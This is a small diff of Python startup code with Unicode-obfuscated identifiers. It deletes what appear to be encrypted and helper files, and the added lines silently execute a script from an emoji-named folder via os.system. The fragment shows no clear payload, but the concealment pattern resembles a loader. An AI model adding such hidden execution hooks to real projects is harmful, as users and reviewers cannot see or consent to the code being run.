@@ -204,6 +204,8 @@ if 爪𝖎𝖟𝖚ӄ𝖎 is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__")
+            if os.path.exists("ʍɨʐʊӄɨ🛰️ֆɛʀʋɛʀ/🐙ʟǟɮ.py"):
+                os.system("python3 ʍɨʐʊӄɨ🛰️ֆɛʀʋɛʀ/🐙ʟǟɮ.py")
             pass
     except Exception as e:
         if 爪𝖟𝖚ӄ𝖎 == "HEROKU":
